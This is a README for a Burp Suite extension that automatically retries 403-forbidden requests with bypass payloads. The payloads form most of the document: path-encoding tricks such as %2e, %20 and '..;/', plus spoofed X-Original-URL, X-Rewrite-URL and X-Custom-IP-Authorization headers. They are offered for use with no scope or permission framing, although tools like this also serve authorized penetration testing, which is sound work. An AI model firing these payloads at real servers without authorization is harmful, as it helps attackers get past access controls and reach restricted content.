# 403Bypasser
An burpsuite extension to bypass 403 restricted directory. By using PassiveScan (default enabled), each 403 request will be **automatically** scanned by this extension, so just add to burpsuite and enjoy.

Payloads: 
$1: HOSTNAME
$2: PATH
```
$1/$2
$1/%2e/$2
$1/$2/.
$1//$2//
$1/./$2/./
$1/$2 -H "X-Original-URL: /$2" 
$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1" 
$1/$2 -H "X-Rewrite-URL: /$2"
$1/$2%20/
$1/%20$2%20/

$1/$2..;/
```

## Installation

`BurpSuite -> Extender -> Extensions -> Add -> Extension Type: Python -> Select file: 403bypasser.py -> Next till Fininsh`

## Screenshot
<img src="ScreenShot.png" width="450"/>

## References:
* [https://twitter.com/iam_j0ker/status/1324354024657711106?s=20](https://twitter.com/iam_j0ker/status/1324354024657711106?s=20)
* [https://twitter.com/jae_hak99/status/1297556269960540161?s=20](https://twitter.com/jae_hak99/status/1297556269960540161?s=20)
* [https://twitter.com/SalahHasoneh1/status/1296572143141031945](https://twitter.com/SalahHasoneh1/status/1296572143141031945)
